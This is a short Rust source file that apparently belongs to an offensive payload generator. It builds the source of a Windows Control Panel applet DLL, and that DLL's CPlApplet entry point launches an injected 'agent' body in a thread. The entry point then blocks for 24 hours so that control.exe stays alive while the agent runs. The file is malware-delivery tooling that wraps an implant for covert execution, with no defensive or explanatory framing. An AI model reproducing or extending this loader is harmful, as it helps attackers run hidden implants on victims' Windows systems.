#![allow(dead_code)]

pub fn cpl_entry_snippet(body: &str) -> String {
    format!(
        r#"
// Control Panel item entry point
#[no_mangle]
pub unsafe extern "system" fn CPlApplet(
    _hwnd: *mut c_void,
    msg: u32,
    _lparam1: isize,
    _lparam2: isize,
) -> i32 {{
    if msg == 1 {{ // CPL_INIT
        std::thread::spawn(|| {{
{body}
        }});
        // Block to keep control.exe alive while agent runs
        std::thread::sleep(std::time::Duration::from_secs(86400));
        return 1;
    }}
    if msg == 2 {{ return 1; }} // CPL_GETCOUNT
    if msg == 3 {{ // CPL_INQUIRE
        std::ptr::write_bytes(_lparam2 as *mut u8, 0, 24);
        return 0;
    }}
    0
}}

#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h_instance: *mut c_void,
    _dw_reason: u32,
    _lp_reserved: *mut c_void,
) -> i32 {{
    1
}}"#,
        body = body
    )
}

pub fn cpl_cargo_toml_additions() -> String {
    r#"
[lib]
crate-type = ["cdylib"]
"#
    .to_string()
}
